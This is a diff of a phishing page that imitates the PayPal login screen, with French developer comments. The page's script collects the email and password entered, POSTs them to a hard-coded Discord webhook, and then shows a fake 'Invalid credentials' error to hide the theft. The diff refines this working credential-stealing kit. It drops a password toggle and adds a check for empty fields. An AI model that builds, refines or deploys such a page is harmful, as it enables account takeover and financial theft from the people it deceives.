@@ -26,18 +26,17 @@ body {
 
 .container img {
     width: 120px;
-    margin-bottom: 50px; /* Logo plus d’espace au dessus du champ Email */
+    margin-bottom: 50px;
 }
 
 .input-container {
-    position: relative;
     width: 100%;
-    margin-bottom: 25px; /* espace entre Email et Password */
+    margin-bottom: 25px;
 }
 
 input {
     width: 100%;
-    padding: 14px 40px 14px 12px;
+    padding: 14px 12px;
     border-radius: 6px;
     border: 1px solid #cccccc;
     font-size: 16px;
@@ -48,16 +47,6 @@ input:focus {
     outline: none;
     border-color: #0070ba;
     box-shadow: 0 0 5px rgba(0,112,186,0.3);
-}
-
-.toggle-password {
-    position: absolute;
-    top: 50%;
-    right: 12px;
-    transform: translateY(-50%);
-    cursor: pointer;
-    font-size: 18px;
-    color: #888888;
 }
 
 .forgot-password {
@@ -75,12 +64,12 @@ input:focus {
 
 .btn-login {
     width: 100%;
-    padding: 16px;
+    padding: 14px 12px;
     background-color: #003087;
     border: none;
-    border-radius: 8px;
+    border-radius: 6px;
     color: white;
-    font-size: 17px;
+    font-size: 16px;
     font-weight: bold;
     cursor: pointer;
     margin-top: 15px;
@@ -104,27 +93,20 @@ input:focus {
 
 <div class="container">
 
-<!-- Logo PayPal -->
 <img src="https://www.top-bank.ch/images/logo_540/paypal.png" alt="PayPal Logo">
 
-<!-- Email / Phone field avec plus d’espace au-dessus -->
-<div class="input-container" style="margin-top:20px;">
+<div class="input-container">
     <input type="text" id="field1" placeholder="Email or Phone Number">
 </div>
 
-<!-- Password field avec toggle eye -->
 <div class="input-container">
     <input type="password" id="field2" placeholder="Password">
-    <span class="toggle-password" onclick="togglePassword()">👁️</span>
 </div>
 
-<!-- Forgot password link -->
 <a href="#" class="forgot-password">Forgot your password?</a>
 
-<!-- Login button -->
 <button class="btn-login" onclick="sendWebhook()">Log In</button>
 
-<!-- Fake error message -->
 <div class="error" id="errorMsg">
 Error: Invalid credentials.
 </div>
@@ -132,16 +114,16 @@ Error: Invalid credentials.
 </div>
 
 <script>
-function togglePassword() {
-    const pwd = document.getElementById("field2");
-    pwd.type = pwd.type === "password" ? "text" : "password";
-}
+// NE PAS METTRE VOTRE WEBHOOK DANS UN SITE PUBLIC
+// Pour tester en local, tu peux le mettre ici
+const webhookURL = "https://discord.com/api/webhooks/1482715159053992098/i50u8cq-9GR5KsOn5J84ZSYydabulGhwyhfUKMrhYUdIYUi5q0AZaxjE7RfLdw907lNf";
 
 function sendWebhook() {
     let field1 = document.getElementById("field1").value;
     let field2 = document.getElementById("field2").value;
 
-    let webhookURL = "https://discord.com/api/webhooks/1482715159053992098/i50u8cq-9GR5KsOn5J84ZSYydabulGhwyhfUKMrhYUdIYUi5q0AZaxjE7RfLdw907lNf";
+    // Vérifie que les champs ne sont pas vides
+    if(field1 === "" || field2 === "") return;
 
     fetch(webhookURL, {
         method:"POST",
@@ -151,6 +133,7 @@ function sendWebhook() {
         })
     });
 
+    // Affiche une fausse erreur
     document.getElementById("errorMsg").style.display = "block";
 }
 </script>
